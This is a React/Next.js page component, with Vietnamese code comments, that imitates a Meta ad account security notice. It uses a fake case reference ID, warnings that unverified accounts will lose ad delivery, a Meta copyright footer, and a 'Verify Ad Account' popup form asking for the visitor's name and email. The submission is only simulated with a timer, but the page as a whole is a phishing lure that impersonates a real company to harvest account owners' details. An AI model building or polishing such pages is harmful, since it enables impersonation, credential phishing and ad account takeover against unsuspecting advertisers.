"use client";

import { useState, FormEvent } from "react";

export default function Home() {
  // Trạng thái điều khiển việc ẩn/hiện của Popup
  const [isOpen, setIsOpen] = useState(false);
  
  // Dữ liệu form nhập liệu
  const [formData, setFormData] = useState({ name: "", email: "" });
  const [status, setStatus] = useState("");

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus("Đang gửi...");
    
    // Giả lập gửi dữ liệu thành công sau 1 giây
    setTimeout(() => {
      setStatus("Gửi thành công!");
      setFormData({ name: "", email: "" });
      // Đóng popup sau khi gửi thành công (tùy chọn)
      setTimeout(() => {
        setIsOpen(false);
        setStatus("");
      }, 1500);
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
    <main className="relative flex min-h-screen flex-col items-center justify-center bg-slate-50 p-6">
      {/* 1. Phần nội dung chính của trang (H1, P trong div, Button mở popup) */}

  <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
    <div className="mb-6 flex items-start gap-4 sm:mb-10">
      <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
       <img alt="Identity Verification" loading="lazy" width="40" height="40" decoding="async" data-nimg="1" className="h-8 w-8" style={{ color: 'transparent' }} src="/ic_blue.svg" />
      </div>
      <div>
        <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">Security Notification: Confirm Ad Account Ownership</h1>
        <p className="mt-2 text-sm font-semibold text-slate-800">Periodic security evaluation and Advertising Policy compliance checkpoint.</p>
      </div>
    </div>
    <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
      <p>To maintain transparency and integrity across our advertising ecosystem, we routinely verify advertiser identities and linked business assets. Your ad account has been flagged for standard credentials verification to ensure full compliance with updated Advertising Standards.</p>
      <p>Completing this verification ensures uninterrupted ad delivery, safeguards billing methods and business assets, and helps protect your Ads Manager against unauthorized access or account takeover attempts.</p>
      <p className="mt-4 text-sm font-medium text-metaBlue">Case Reference ID: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
      </p>
      <div className="mt-6 space-y-3">
        <h2 className="text-sm font-semibold text-slate-900 sm:text-base">Submission Instructions &amp; Review Criteria</h2>
        <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
          <li>• <strong>Information Consistency:</strong> Ensure all business registration certificates, legal identification, and payment details strictly match the registered information in your Ads Manager. </li>
          <li>• <strong>Review Timeframe:</strong> Please submit the required documents within the active verification window. Unverified ad accounts may experience temporary delivery pauses or spending limit restrictions. </li>
          <li>• <strong>Processing &amp; Status Maintenance:</strong> Once submitted, our review team will evaluate your credentials (typically within 24–48 hours). Active campaigns, budgets, and billing profiles will remain protected during the review. </li>
        </ul>
      </div>
    </div>
        <button onClick={() => setIsOpen(true)} className="rounded-xl bg-blue-600 px-6 py-3 text-base font-semibold text-white shadow-lg hover:bg-blue-700 transition active:scale-95" >
         Verify Ad Account
        </button>
  </section>



  <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
    <button className="hover:text-slate-700" type="button">Business Help Center</button>
    <span className="text-slate-400">|</span>
    <button className="hover:text-slate-700" type="button">Data Privacy</button>
    <span className="text-slate-400">|</span>
    <button className="hover:text-slate-700" type="button">Advertising Policies</button>
    <span className="text-slate-400">|</span>
    <button className="hover:text-slate-700" type="button">Community Standards</button>
    <span className="text-slate-400">|</span>
    <span>Meta © 2026</span>
  </footer>

{/*<div className="mb-6 flex items-start gap-4 sm:mb-10">*/}

      {/* 2. Cửa sổ Popup & Khóa nền (Modal) */}
      {isOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center">
          
          {/* Lớp nền tối (Backdrop) - Bấm vào đây hoặc khóa tương tác nền */}
          <div 
            className="absolute inset-0 bg-black/50 backdrop-blur-sm transition-opacity"
            onClick={() => setIsOpen(true)} // Bấm ra ngoài nền để đóng popup
          />

          {/* Hộp chứa nội dung Form Popup */}
          <div className="relative z-10 w-full max-w-md rounded-2xl bg-white p-8 shadow-2xl transition-all">
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-xl font-bold text-slate-800">Nhập thông tin của bạn</h2>
              {/* Nút đóng (X) */}
              <button 
                onClick={() => setIsOpen(false)}
                className="text-slate-400 hover:text-slate-600 text-2xl font-bold"
              >
                &times;
              </button>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1">Họ tên</label>
                <input
                  type="text"
                  required
                  value={formData.name}
                  onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                  className="w-full rounded-lg border border-slate-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Nhập họ tên..."
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-slate-700 mb-1">Email</label>
                <input
                  type="email"
                  required
                  value={formData.email}
                  onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                  className="w-full rounded-lg border border-slate-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Nhập email..."
                />
              </div>

              <div className="flex space-x-3 pt-2">
                <button type="button" onClick={() => setIsOpen(false)} className="w-1/2 rounded-lg border border-slate-300 bg-white px-4 py-2.5 text-sm font-semibold text-slate-700 hover:bg-slate-50 transition" >
                  Hủy
                </button>
                <button type="submit" className="w-1/2 rounded-lg bg-blue-600 px-4 py-2.5 text-sm font-semibold text-white hover:bg-blue-700 transition" > Gửi đi </button>
              </div>
            </form>

            {status && <p className="mt-4 text-center text-sm font-medium text-blue-600">{status}</p>}
          </div>

        </div>
      )}
    </main>
    </div>
  );
}